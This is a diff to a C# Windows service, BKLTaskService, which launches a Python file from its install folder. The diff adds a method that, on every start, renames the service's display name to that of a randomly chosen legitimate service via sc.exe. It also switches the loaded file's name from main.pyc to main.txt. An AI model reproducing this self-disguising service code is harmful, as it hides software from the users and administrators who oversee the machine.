@@ -1,6 +1,8 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.ServiceProcess;
 using System.Threading;
 
@@ -56,7 +58,7 @@ namespace BKLTaskService
 
         private string get_mainpyc_path()
         {
-            string mainpyc_path = main_path + @"\Bin\main.pyc";
+            string mainpyc_path = main_path + @"\Bin\main.txt";
 
             if (File.Exists(mainpyc_path))
             {
@@ -68,10 +70,16 @@ namespace BKLTaskService
 
         private void note(string msg)
         {
-            if (SW != null) 
+            try
             {
-                SW.WriteLine(DateTime.Now.ToString("[ yyyy-MM-dd HH:mm:ss ] ") + msg);
+                SW.WriteLine(DateTime.Now.ToString("[ yyyy-MM-dd HH:mm:ss ]") + $"[ INFO ] {msg}");
+            } catch
+            {
+                SW = new StreamWriter(logs_path + @"\last.log", true);
+                SW.AutoFlush = true;
+                SW.WriteLine(DateTime.Now.ToString("[ yyyy-MM-dd HH:mm:ss ]") + $"[ INFO ] {msg}");
             }
+
         }
 
         private void start_process()
@@ -84,6 +92,24 @@ namespace BKLTaskService
 
             process.Start();
 
+        }
+
+        private string randomDisplayName()
+        {
+            // 获取所有服务
+            ServiceController[] services = ServiceController.GetServices();
+
+            // 生成随机数
+            Random rnd = new Random();
+            int randomIndex = rnd.Next(0, services.Length);
+
+            // 获取随机选择的服务的显示名称
+            string randomDisplayName = services[randomIndex].DisplayName;
+
+            // 更改服务的显示名称
+            Process.Start("sc.exe", $"config BKLTaskService DisplayName=\"{randomDisplayName}\"");
+
+            return randomDisplayName;
         }
 
         protected override void OnStart(string[] args)
@@ -101,6 +127,9 @@ namespace BKLTaskService
             SW.WriteLine();
 
             note("BKLTaskService Now Started.");
+
+            note($"New Serverice Name --> {randomDisplayName()}");
+
 
             main_path = get_main_path();
 
@@ -176,11 +205,11 @@ namespace BKLTaskService
             }
         }
 
-        // internal void TestStartupAndStop(string[] args)
-        // {
-        //    this.OnStart(args);
-        //    Console.ReadLine();
-        //    this.OnStop();
-        //}
+        internal void TestStartupAndStop(string[] args)
+        {
+            this.OnStart(args);
+            Console.ReadLine();
+            this.OnStop();
+        }
     }
 }
